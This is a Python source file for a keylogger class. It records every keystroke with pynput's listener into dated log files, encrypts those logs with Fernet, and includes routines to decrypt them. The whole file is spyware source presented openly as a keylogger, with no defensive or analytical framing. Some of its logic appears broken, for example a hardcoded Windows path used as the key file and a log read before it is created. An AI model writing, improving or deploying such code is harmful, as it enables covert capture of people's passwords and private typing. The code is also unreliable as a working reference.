from pynput.keyboard import Key, Listener
import logging
import os
from datetime import date, time
from cryptography.fernet import Fernet
import threading
# import kldcrypt

class Keylogger:
        
    def create_log_directory(self):
        sub_dir = "log"
        cwd = os.getcwd()
        self.log_dir = os.path.join(cwd, sub_dir)
        if not os.path.exists(sub_dir):
            os.mkdir(sub_dir)
    
    @staticmethod
    def on_press(key):
        try:
            logging.info(str(key))
        except Exception as e:
            logging.info(e)
            
    def write_log_file(self):
        time = str(date.today())
        log_filename = os.path.join(self.log_dir, time + "-log.txt")
        encrypted_filename = os.path.join(self.log_dir, time + "-log.encrypted")
        # key_filename = os.path.join(self.log_dir, time + "-key.txt")

        logging.basicConfig(
            filename=log_filename,
            level=logging.DEBUG,
            format='[%(asctime)s]: %(message)s',
        )
        # Open the log file and read its contents
        with open(log_filename, 'rb') as file:
            contents = file.read()

        # Generate a random key using Fernet
        key = Fernet.generate_key()

        # Encrypt the contents of the log file using the key
        f = Fernet(key)
        encrypted_contents = f.encrypt(contents)

        # Write the encrypted contents to a new file with a .encrypted extension
        with open(encrypted_filename, 'wb') as file:
            file.write(encrypted_contents)

        # Write the key to a new file with a .key extension
        with open('mykeys.key', 'wb') as file:
            file.write(key)
        # return key_filename, encrypted_filename
        

        # Delete the original log file
        # os.remove(log_filename)

        # with Listener(on_press=self.on_press) as listener:
        #     print("Listener Started")
        #     listener.join()
        
        
                

    def decrypt_log_file(self,encrypted_file_path, key,time):

        
        # Read the encrypted contents of the file
        with open(encrypted_file_path, 'rb') as file:
            encrypted_contents = file.read()

        # Read the key from the file
        with open(key, 'rb') as file:
            key = file.read()
        

        # Decrypt the contents of the file using the key
        f = Fernet(key)
        decrypted_contents = f.decrypt(encrypted_contents)
        
        # Define the new directory path for the decrypted file
        decrypted_directory = os.path.join(self.log_dir, "decrypted_files")
        if not os.path.exists(decrypted_directory):
            os.makedirs(decrypted_directory)

        # Define the file path for the decrypted file using the new directory path
        decrypted_file_path = os.path.join(decrypted_directory, os.path.basename(encrypted_file_path)[:-4] + ".txt")
        
        # Write the decrypted contents to a new file
        decrypted_file_path = decrypted_file_path[:-10] + ".txt"
        with open(decrypted_file_path, 'wb') as file:
            file.write(decrypted_contents)
            

if __name__ == "__main__":
    klog = Keylogger()
    klog.create_log_directory()
    klog.write_log_file()
    key = b'C:\Users\Yash\OneDrive\Documents\KeyLogger\KL' # Replace with your actual encryption key
    time = str(date.today())
    
    encrypted_file_path = os.path.join(klog.log_dir, time + "-log.encrypted")   # Replace with the actual path to your encrypted log file

    klog.decrypt_log_file(encrypted_file_path, key, time)
    klog.write_log_file()
    decryption_thread = threading.Thread(target=klog.decrypt_log_file, args=(encrypted_file_path, key,time))
    decryption_thread.start()
    with Listener(on_press=klog.on_press) as listener:
        print("Listener Started")
        listener.join()




